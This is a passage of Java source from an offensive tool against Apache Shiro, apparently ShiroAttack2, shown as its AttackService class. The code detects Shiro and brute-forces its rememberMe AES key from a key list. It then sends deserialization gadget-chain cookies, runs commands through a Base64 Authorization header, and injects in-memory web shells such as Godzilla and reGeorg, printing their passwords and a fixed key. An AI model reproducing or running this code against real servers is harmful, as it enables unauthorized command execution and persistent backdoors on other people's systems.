
package com.summersec.attack.core;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.Method;
import com.summersec.attack.deser.frame.Shiro;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.plugins.servlet.MemBytes;
import com.summersec.attack.deser.plugins.keytest.KeyEcho;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.UI.MainController;
import com.summersec.attack.integration.generator.GeneratorFacade;
import com.summersec.attack.integration.generator.model.EchoGenerateRequest;
import com.summersec.attack.integration.generator.model.EchoGenerateResult;
import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
import com.summersec.attack.utils.AppLogger;
import com.summersec.attack.utils.HttpUtil;
import com.summersec.attack.utils.Utils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javafx.application.Platform;
import javafx.collections.ObservableList;
import javafx.scene.control.TextArea;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.codec.Base64;

public class AttackService {
    public static Shiro shiro = new Shiro();
    public static int aesGcmCipherType = 0;
    public static Object principal = KeyEcho.getObject();
    public static String cwd = System.getProperty("user.dir");
    public String url;
    public String method;
    public String shiroKeyWord;
    public Integer timeout;
    public static String attackRememberMe = null;
    public static String gadget = null;
    public static String realShiroKey = null;
    public static Map<String, String> globalHeader = null;
    public static String postData = null;
    private final MainController mainController;
    private final GeneratorFacade generatorFacade = new GeneratorFacade();
    public int flagCount = 0;

    public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
        this.mainController = (MainController)ControllersFactory.controllers.get(MainController.class.getSimpleName());
        this.url = url;
        this.method = method;
        this.timeout = Integer.parseInt(timeout) * 1000;
        this.shiroKeyWord = shiroKeyWord;
        this.globalHeader = globalHeader;
        this.postData = postData;

    }

    /**
     * 先铺全局头，再用本次请求的 header 覆盖（Cookie 除外：与已有 Cookie 合并）。
     * 避免 5.0 早期「先 header 再 global」时全局里的 Authorization 等覆盖掉命令执行请求里的 Basic 命令。
     */
    public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
        HashMap<String, String> combineHeaders = new HashMap<String, String>();
        if (globalHeader != null) {
            combineHeaders.putAll(globalHeader);
        }
        if (header != null) {
            for (Map.Entry<String, String> e : header.entrySet()) {
                String key = e.getKey();
                if (key == null) {
                    continue;
                }
                String value = e.getValue();
                if ("cookie".equalsIgnoreCase(key.trim())) {
                    String existingCookie = getCookieHeaderValue(combineHeaders);
                    combineHeaders.put("Cookie", mergeCookieParts(
                            existingCookie == null ? "" : existingCookie,
                            value == null ? "" : value));
                } else {
                    combineHeaders.put(key, value);
                }
            }
        }
        return normalizeCookieHeader(combineHeaders);
    }

    /** 合并两段 Cookie 值（去尾部多余分号），业务 Cookie 在前、攻击 Cookie 在后，与 4.7 习惯一致。 */
    private static String mergeCookieParts(String first, String second) {
        String a = first == null ? "" : first.trim();
        String b = second == null ? "" : second.trim();
        while (a.endsWith(";")) {
            a = a.substring(0, a.length() - 1).trim();
        }
        while (b.endsWith(";")) {
            b = b.substring(0, b.length() - 1).trim();
        }
        if (a.isEmpty()) {
            return b;
        }
        if (b.isEmpty()) {
            return a;
        }
        return a + "; " + b;
    }

    private static String getCookieHeaderValue(HashMap<String, String> map) {
        if (map == null) {
            return null;
        }
        for (Map.Entry<String, String> e : map.entrySet()) {
            if (e.getKey() != null && "cookie".equalsIgnoreCase(e.getKey().trim())) {
                return e.getValue();
            }
        }
        return null;
    }

    /**
     * 将 Map 中所有与 Cookie 等价的键（大小写、前后空白）合并为<strong>唯一</strong>一条 {@code Cookie} 请求头，
     * 避免出现抓包里的双 {@code Cookie:} 行。部分容器/安全组件对多行 Cookie 的合并顺序与 4.7/5.0 不一致，
     * 会导致只带上 JSESSIONID 或只带上 rememberMe，从而出现 deleteMe 或会话异常。
     */
    private static HashMap<String, String> normalizeCookieHeader(HashMap<String, String> map) {
        if (map == null || map.isEmpty()) {
            return map;
        }
        List<String> cookieKeys = new ArrayList<>();
        for (String k : map.keySet()) {
            if (k != null && "cookie".equalsIgnoreCase(k.trim())) {
                cookieKeys.add(k);
            }
        }
        if (cookieKeys.isEmpty()) {
            return map;
        }
        String merged = null;
        for (String k : cookieKeys) {
            String v = map.remove(k);
            merged = mergeCookieParts(merged == null ? "" : merged, v == null ? "" : v);
        }
        if (merged != null && !merged.isEmpty()) {
            map.put("Cookie", merged);
        }
        return map;
    }

    /**
     * 从请求头 Map 中拆出合并后的 Cookie 字符串，其余头交给 {@link HttpRequest#headerMap}；
     * Cookie 单独 {@link HttpRequest#header(String, String)}，避免 Hutool 对 map 内超长 Cookie 等场景拆成多个 {@code Cookie:} 行。
     */
    private static AbstractMap.SimpleEntry<HashMap<String, String>, String> peelCookieHeader(HashMap<?, ?> combined) {
        HashMap<String, String> rest = new HashMap<String, String>();
        String merged = null;
        if (combined != null) {
            for (Map.Entry<?, ?> e : combined.entrySet()) {
                String k = e.getKey() == null ? null : e.getKey().toString();
                String v = e.getValue() == null ? null : e.getValue().toString();
                if (k != null && "cookie".equalsIgnoreCase(k.trim())) {
                    merged = mergeCookieParts(merged == null ? "" : merged, v == null ? "" : v);
                } else if (k != null) {
                    rest.put(k, v);
                }
            }
        }
        if (merged != null) {
            while (merged.endsWith(";")) {
                merged = merged.substring(0, merged.length() - 1).trim();
            }
            if (merged.isEmpty()) {
                merged = null;
            }
        }
        return new AbstractMap.SimpleEntry<HashMap<String, String>, String>(rest, merged);
    }

    /** Hutool GET：先 headerMap（无 Cookie），再单次设置 Cookie，保证线上仅一条 Cookie 头。 */
    private HttpResponse executeHutoolGetFollowNoRedirect(HashMap<?, ?> combineHeaders) {
        AbstractMap.SimpleEntry<HashMap<String, String>, String> peeled = peelCookieHeader(combineHeaders);
        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
        HttpRequest req = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method), this.url)
                .setProxy(proxy)
                .timeout(this.timeout)
                .setFollowRedirects(false);
        HashMap<String, String> rest = peeled.getKey();
        if (rest != null && !rest.isEmpty()) {
            req.headerMap(rest, true);
        }
        String ck = peeled.getValue();
        if (ck != null && !ck.isEmpty()) {
            req.header("Cookie", ck);
        }
        return req.execute();
    }

    public String headerHttpRequest(HashMap<String, String> header) {
        String result = null;
        HashMap combineHeaders = this.getCombineHeaders(header);
        try {
/*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
            return result;*/
/*            if (result.contains("Host")){
                return result;
            }*/
            if (this.method.equals("GET")) {
                result = this.executeHutoolGetFollowNoRedirect(combineHeaders).toString();

            } else {
                String contentType = combineHeaders.containsKey("Content-Type") ? (String) combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
            }
        } catch (Exception var5) {
            this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
        }


        return result;
    }

    /**
     * 利用链探测专用：GET 时把 Hutool 返回的响应头与正文拼在一起，避免仅依赖 {@link HttpResponse#toString()}
     * 导致漏掉 Tomcat/Spring 回显写入的 {@code Host} 响应头。
     */
    private String gadgetProbeHttpRequest(HashMap<String, String> header) {
        HashMap<String, String> combineHeaders = this.getCombineHeaders(header);
        try {
            if (this.method.equals("GET")) {
                HttpResponse response = this.executeHutoolGetFollowNoRedirect(combineHeaders);
                return flattenHutoolResponse(response);
            }
            String contentType = combineHeaders.containsKey("Content-Type")
                    ? combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
            return HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
        } catch (Exception e) {
            this.mainController.logTextArea.appendText(Utils.log(e.getMessage()));
            return "";
        }
    }

    private static String flattenHutoolResponse(HttpResponse response) {
        if (response == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(1024);
        try {
            Map<String, List<String>> headerMap = response.headers();
            if (headerMap != null) {
                for (Map.Entry<String, List<String>> e : headerMap.entrySet()) {
                    String name = e.getKey();
                    List<String> values = e.getValue();
                    if (name == null || values == null) {
                        continue;
                    }
                    for (String v : values) {
                        sb.append(name).append(':').append(v == null ? "" : v).append('\n');
                    }
                }
            }
        } catch (Throwable ignored) {
            sb.append(response.toString());
        }
        String body = response.body();
        if (body != null) {
            sb.append('\n').append(body);
        }
        return sb.toString();
    }

    /**
     * TomcatEcho / SpringEcho / AllEcho 等：链执行成功时常在响应头出现 {@code Host: ...} 或正文出现 {@code $$$...$$$}。
     * <p>成功响应里仍可能带有 {@code rememberMe=deleteMe}（Shiro 清理 Cookie），故先判断回显特征，仅当<strong>无</strong>上述特征时才以 {@code deleteMe} 判失败。</p>
     */
    static boolean responseIndicatesGadgetHit(String probeText) {
        if (probeText == null || probeText.isEmpty()) {
            return false;
        }
        // 先认回显：链执行成功后 Tomcat/Spring 会写 Host 响应头或 $$$；同一响应里仍可能有 rememberMe=deleteMe（Shiro 清理 Cookie），不能因 deleteMe 否定命中
        if (probeText.contains("$$$")) {
            return true;
        }
        if (probeText.contains("Host:") || probeText.contains("host:")) {
            return true;
        }
        if (probeText.contains("Host=[") || probeText.contains("host=[")) {
            return true;
        }
        if (probeText.contains("=deleteMe")) {
            return false;
        }
        return false;
    }

    public String bodyHttpRequest(HashMap<String, String> header, String postString) {
        String result = "";
        HashMap combineHeaders = this.getCombineHeaders(header);
        try {

            if (postString.equals("")) {
                if (this.method.equals("GET")) {
                    HttpResponse resp = this.executeHutoolGetFollowNoRedirect(combineHeaders);
                    result = flattenHutoolResponse(resp);
                    if (!responseIndicatesGadgetHit(result) && !result.contains("$$$")) {
                        result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
                    }
                } else {
                    result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
                }
            } else if (!result.contains("Host") || !this.method.equals("GET")) {
                result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
            }
        } catch (Exception var6) {
            this.mainController.logTextArea.appendText(Utils.log(var6.getMessage()));
        }

        return result;
    }

    public String classifyHttpResponse(String result) {
        if (result == null) {
            return "未收到响应";
        }
        String trimmed = result.trim();
        if (trimmed.isEmpty()) {
            return "收到空响应";
        }
        if (result.contains("=deleteMe")) {
            return "检测到 rememberMe=deleteMe，目标可能拒绝或重置了 Cookie";
        }
        if (result.contains("->|") && result.contains("|<-")) {
            return "检测到特征回显内容";
        }
        if (result.contains("HTTP/1.1 302") || result.contains("HTTP/1.1 301")
                || result.contains("HTTP/1.1 303") || result.contains("HTTP/1.1 307")
                || result.contains("HTTP/1.1 308")) {
            return "收到重定向响应，未发现明确回显";
        }
        if (result.contains("HTTP/1.1 200") || result.contains("HTTP/1.0 200")) {
            return "收到 200 响应，但未发现明确回显特征";
        }
        return "已收到响应，但未发现明确回显特征";
    }

    public void appendResponseSummary(TextArea logArea, String prefix, String result) {
        if (logArea == null) {
            return;
        }
        String status = classifyHttpResponse(result);
        int length = result == null ? 0 : result.length();
        logArea.appendText(Utils.log(prefix + " 响应长度=" + length));
        logArea.appendText(Utils.log(prefix + " 判定=" + status));
    }

    public List<String> getALLShiroKeys() {
        ArrayList shiroKeys = new ArrayList();

        try {
            List<String> array = new ArrayList(Arrays.asList(cwd, "data", "shiro_keys.txt"));
            File shiro_file = new File(StringUtils.join(array, File.separator));
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));

            try {
                String line;
                try {
                    while((line = br.readLine()) != null) {
                        shiroKeys.add(line);
                    }
                } catch (IOException var10) {
                    var10.printStackTrace();
                }
            } finally {
                if (br != null) {
                    br.close();
                }

            }
        } catch (Exception var12) {
            String message = var12.getMessage();
            System.out.println(message);
        }

        return shiroKeys;
    }

    public List<String> generateGadgetEcho(ObservableList gadgetItems, ObservableList echoesItems) {
        List<String> targets = new ArrayList();

        for(int i = 0; i < gadgetItems.size(); ++i) {
            for(int j = 0; j < echoesItems.size(); ++j) {
                System.out.println();
                System.out.println(echoesItems.get(j));
                targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
            }
        }

        return targets;
    }

    public boolean gadgetCrack(String gadgetOpt, String echoOpt, String spcShiroKey) {
        boolean flag = false;

        try {
            String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
            if (rememberMe != null) {
                HashMap header = new HashMap();
                header.put("Cookie", rememberMe + ";");
//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                String result = this.gadgetProbeHttpRequest(header);
                if (responseIndicatesGadgetHit(result)) {
                    Platform.runLater(() -> {
                        this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                        this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
                        this.mainController.gadgetOpt.setValue(gadgetOpt);
                        this.mainController.echoOpt.setValue(echoOpt);
                    });
                    gadget = gadgetOpt;
                    attackRememberMe = rememberMe;
                    flag = true;
                } else {
                    final String failHint;
                    if (result != null && result.contains("=deleteMe")) {
                        failHint = " -> 响应含 rememberMe=deleteMe（密钥错误、AES 模式不符或利用链未执行）";
                    } else if (result != null && (result.contains("HTTP/1.1 302") || result.contains("HTTP/1.0 302"))) {
                        failHint = " -> 收到 302 重定向且无回显特征，多为未登录或 Shiro 未接受 Cookie";
                    } else {
                        failHint = "";
                    }
                    final String hint = failHint;
                    Platform.runLater(() -> this.mainController.logTextArea.appendText(
                            Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + hint)));
                }
            } else {
                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> payload 构造失败")));
            }
        } catch (Throwable var8) {
            String msg = var8.getMessage();
            if (msg == null || msg.trim().isEmpty()) {
                msg = var8.getClass().getName();
            }
            AppLogger.error("gadgetCrack 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var8);
            final String finalMsg = msg;
            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> " + finalMsg)));
        }

        return flag;
    }

    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey) {
        String rememberMe = null;

        try {
            Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadgetOpt);
            if (gadgetClazz == null) {
                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("未找到利用链类: " + gadgetOpt)));
                return null;
            }
            ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
            Object template = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template);
            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
        } catch (Throwable var9) {
            var9.printStackTrace();
            String msg = var9.getMessage();
            if (msg == null || msg.trim().isEmpty()) {
                msg = var9.getClass().getName();
            }
            AppLogger.error("GadgetPayload 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var9);
            final String finalMsg = msg;
            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log(finalMsg)));
        }

        return rememberMe;
    }

    private Class<? extends ObjectPayload> resolvePayloadClass(String gadgetOpt) {
        if (gadgetOpt == null || gadgetOpt.trim().isEmpty()) {
            return null;
        }
        String className = gadgetOpt.substring(0, 1).toUpperCase() + gadgetOpt.substring(1);
        try {
            return (Class<? extends ObjectPayload>) Class.forName("com.summersec.attack.deser.payloads." + className);
        } catch (Throwable ignored) {
            return null;
        }
    }

    public void simpleKeyCrack(String shiroKey) {
        try {
            List<String> tempList = new ArrayList();
            tempList.add(shiroKey);
            if (flagCount ==1){
                this.keyTestTask(tempList);
            }
            else{
                this.keyTestTask2(tempList);}

        } catch (Exception var3) {
            this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
        }

    }

    public boolean verifyKey(String shiroKey) {
        try {
            if (shiroKey == null || shiroKey.trim().isEmpty()) {
                return false;
            }
            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, this.shiroKeyWord, shiroKey);
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", rememberMe);
            String result = this.headerHttpRequest(header);
            if (result == null || result.isEmpty()) {
                return false;
            }
            if (this.flagCount <= 1) {
                return !result.contains("=deleteMe");
            }
            return countDeleteMe(result) < this.flagCount;
        } catch (Exception ignored) {
            return false;
        }
    }

    public void keysCrack() {
        try {
            List<String> shiroKeys = this.getALLShiroKeys();
            if (flagCount ==1){
                this.keyTestTask(shiroKeys);
            }
            else {
                //多个shiro场景的爆破key方式
                this.keyTestTask2(shiroKeys);
                this.mainController.logTextArea.appendText(Utils.log("[++] 含有多个shiro场景"));
            }
        } catch (Exception var2) {
            this.mainController.logTextArea.appendText(Utils.log(var2.getMessage()));
        }

    }

    public boolean checkIsShiro() {
        boolean flag = false;

        try {
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", this.shiroKeyWord + "=yes");
            String result = this.headerHttpRequest(header);
//            System.out.println(result);
            flag = result.contains("=deleteMe");

//            if (!flag){
//                flag = result.contains(shiroKeyWord);
//                flag = true;
//            }
            if (flag) {
                this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                flag = true;
                flagCount = countDeleteMe(result);


            } else {
//               再次确认shiro
                HashMap<String, String> header1 = new HashMap();
                header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                String result1 = this.headerHttpRequest(header1);
                flag = result1.contains("=deleteMe");
//                if (!flag){
//                    result1.contains(shiroKeyWord);
//                    flag = true;
//                }
                if(flag){
                    this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                    flag = true;
                    flagCount = countDeleteMe(result);

                }else {

                    this.mainController.logTextArea.appendText(Utils.log("[-] 未发现shiro框架！"));

                }
            }
        } catch (Exception var4) {
            if (var4.getMessage() != null) {
                this.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));
            }
        }

        return flag;
    }

    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom random= new SecureRandom();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    //计算包含几个deleteMe
    public int countDeleteMe(String text){
        // 根据指定的字符构建正则
        Pattern pattern = Pattern.compile("deleteMe");
        // 构建字符串和正则的匹配
        Matcher matcher = pattern.matcher(text);
        int count = 0;
        // 循环依次往下匹配
        while (matcher.find()){ // 如果匹配,则数量+1
            count++;
        }
        return  count;

    }
    public void keyTestTask(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
                                final String foundKey = shirokey;
                                Platform.runLater(() -> {
                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
                                    AttackService.this.mainController.shiroKey.setText(foundKey);
                                });
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            final String failKey1 = shirokey;
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                        } catch (Exception var6) {
                            final String failKey2 = shirokey;
                            final String errMsg1 = var6.getMessage();
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg1)));
                        }

                    }
                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }

    public void keyTestTask2(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
                                final String foundKey = shirokey;
                                Platform.runLater(() -> {
                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
                                    AttackService.this.mainController.shiroKey.setText(foundKey);
                                });
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            final String failKey1 = shirokey;
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                        } catch (Exception var6) {
                            final String failKey2 = shirokey;
                            final String errMsg2 = var6.getMessage();
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg2)));
                        }

                    }
                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }
    public String execCmdTask(String command) {
        HashMap<String, String> header = new HashMap();
        header.put("Cookie", attackRememberMe);
        String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
        header.put("Authorization", "Basic " + b64Command);
        AppLogger.info("执行命令请求: command=" + command);
        String responseText = this.bodyHttpRequest(header, "");
        if (responseText == null) {
            AppLogger.warn("命令执行返回为空响应");
            return null;
        }
        if (!responseText.contains("$$$")) {
            AppLogger.warn("命令执行返回非命令格式，按原始文本输出，长度=" + responseText.length());
            return responseText;
        }
        String[] parts = responseText.split("\\$\\$\\$");
        if (parts.length < 2) {
            AppLogger.warn("命令执行返回分段不足，按原始文本输出，长度=" + responseText.length());
            return responseText;
        }
        String result = parts[1];
        if (result.equals("")) {
            AppLogger.info("命令执行成功但返回为空: command=" + command);
            return "";
        }
        byte[] b64bytes = Base64.decode(result);
        try {
            String defaultEncode = Utils.guessEncoding(b64bytes);
            String decoded = new String(b64bytes, defaultEncode);
            AppLogger.info("命令执行成功: command=" + command + ", responseEncoding=" + defaultEncode + ", responseLength=" + decoded.length());
            return decoded;
        } catch (UnsupportedEncodingException var8) {
            String decoded = new String(b64bytes, StandardCharsets.UTF_8);
            AppLogger.warn("命令执行结果编码探测失败，已回退 UTF-8: command=" + command);
            return decoded;
        }
    }

    public void injectMem(String memShellType, String shellPass, String shellPath) {
        injectMem(memShellType, shellPass, shellPath, null);
    }

    public void injectMem(String memShellType, String shellPass, String shellPath, TextArea outputSink) {
        TextArea logArea = outputSink != null ? outputSink : this.mainController.InjOutputArea;
        boolean changeKeyMode = outputSink != null;
        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
        if (injectRememberMe != null) {
            try {
                String b64Bytecode = MemBytes.getBytes(memShellType);
                if (b64Bytecode == null || b64Bytecode.isEmpty()) {
                    logArea.appendText(Utils.log("[异常] 未找到内存马模板: " + memShellType));
                    logArea.appendText(Utils.log("-------------------------------------------------"));
                    return;
                }
                this.injectMemWithCookieAndUserBody(injectRememberMe, b64Bytecode, shellPass, shellPath, logArea, changeKeyMode, memShellType);
                logArea.appendText(Utils.log("-------------------------------------------------"));
            } catch (Exception var10) {
                logArea.appendText(Utils.log("[异常] " + var10.getMessage()));
                logArea.appendText(Utils.log("-------------------------------------------------"));
            }
        }

    }

    /**
     * 主界面「内存马注入」与「内存马生成 → Shiro 注入」共用：Cookie=InjectMemTool 的 rememberMe，POST {@code user=}&lt;Base64&gt;，附带 p/path。
     *
     * @param memTypeLabel 成功日志中的类型名；用于哥斯拉 / NeoreGeorg / reGeorg 等分支（jMG 可传含 GODZILLA 的英文标签）
     */
    private String injectMemWithCookieAndUserBody(String injectRememberMe, String userBase64Body, String shellPass,
                                                  String shellPath, TextArea logArea, boolean changeKeyMode,
                                                  String memTypeLabel) {
        if (injectRememberMe == null || injectRememberMe.isEmpty()) {
            return null;
        }
        String userPart = userBase64Body == null ? "" : userBase64Body.trim().replaceAll("\\s+", "");
        if (userPart.isEmpty()) {
            return null;
        }
        String label = memTypeLabel != null ? memTypeLabel : "内存马";
        String ul = label.toUpperCase(Locale.ROOT);
        boolean godzillaLike = label.contains("哥斯拉") || ul.contains("GODZILLA");
        boolean neoreGeorgLike = label.contains("NeoreGeorg") || ul.contains("NEOREGEORG");
        boolean reGeorgServlet = label.equals("reGeorg[Servlet]");
        boolean reGeorgFilter = label.equals("reGeorg[Filter]");
        HashMap<String, String> header = new HashMap<String, String>();
        header.put("Cookie", injectRememberMe);
        header.put("p", shellPass != null ? shellPass : "");
        header.put("path", shellPath != null ? shellPath : "");
        try {
            String postString = "user=" + userPart;
            String result = this.bodyHttpRequest(header, postString);
            if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
                String httpAddress = Utils.UrlToDomain(this.url);
                if (changeKeyMode || result.contains("->|change key ok|<-")) {
                    logArea.appendText(Utils.log("[修改结果] 成功"));
                    logArea.appendText(Utils.log("[新 Key] " + shellPass));
                } else {
                    logArea.appendText(Utils.log("[注入结果] 成功"));
                    logArea.appendText(Utils.log("[类型] " + label));
                }
                if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
                    logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
                }
                if (!changeKeyMode && !result.contains("->|change key ok|<-") && godzillaLike) {
                    logArea.appendText(Utils.log("[密码] " + shellPass));
                    logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
                    logArea.appendText(Utils.log("[加密方式] AES"));
                } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !reGeorgServlet && !reGeorgFilter) {
                    logArea.appendText(Utils.log("[密码] " + shellPass));
                }
                if (!changeKeyMode && !result.contains("->|change key ok|<-") && neoreGeorgLike) {
                    logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                }
            } else {
                if (result.contains("->|") && result.contains("|<-")) {
                    logArea.appendText(Utils.log("[服务端响应] " + result));
                }

                String httpAddress = Utils.UrlToDomain(this.url);
                boolean alreadyExists = result.contains("Filter already exists") || result.contains("Servlet already exists");
                if (alreadyExists) {
                    logArea.appendText(Utils.log("[注入结果] 已存在，目标可能已经注入成功"));
                    if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
                        logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
                    }
                    if (!changeKeyMode && godzillaLike) {
                        logArea.appendText(Utils.log("[密码] " + shellPass));
                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
                        logArea.appendText(Utils.log("[加密方式] AES"));
                    } else if (!changeKeyMode && !reGeorgServlet && !reGeorgFilter) {
                        logArea.appendText(Utils.log("[密码] " + shellPass));
                    }
                    if (!changeKeyMode && neoreGeorgLike) {
                        logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                    }
                } else {
                    if (changeKeyMode) {
                        logArea.appendText(Utils.log("[修改结果] 失败，请检查当前利用链、目标环境或重试其他变体"));
                    } else {
                        logArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或者更换新路径"));
                    }
                }
            }
            return result;
        } catch (Exception e) {
            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
            logArea.appendText(Utils.log("-------------------------------------------------"));
            return null;
        }
    }

    /**
     * 使用主界面选中的 Shiro 利用链 + InjectMemTool 生成 Cookie，POST {@code user=} + 类字节码 Base64（与 {@link #injectMem} 相同 HTTP 与结果解析）。
     */
    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload, TextArea sink) {
        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, "", "", sink, null);
    }

    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload,
                                           String shellPass, String shellPath, TextArea sink) {
        return sendInjectMemToolExploit(gadgetOpt, shiroKey, userBase64Payload, shellPass, shellPath, sink, null);
    }

    /**
     * @param memTypeLabelForLog 成功/失败日志中的类型描述；jMG 建议传 {@code jMG/工具/Shell} 等以便匹配 Godzilla 等提示
     */
    public String sendInjectMemToolExploit(String gadgetOpt, String shiroKey, String userBase64Payload,
                                           String shellPass, String shellPath, TextArea sink,
                                           String memTypeLabelForLog) {
        String userPart = userBase64Payload == null ? "" : userBase64Payload.trim().replaceAll("\\s+", "");
        if (userPart.isEmpty()) {
            return null;
        }
        String rememberMe = this.GadgetPayload(gadgetOpt, "InjectMemTool", shiroKey);
        if (rememberMe == null || rememberMe.isEmpty()) {
            return null;
        }
        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
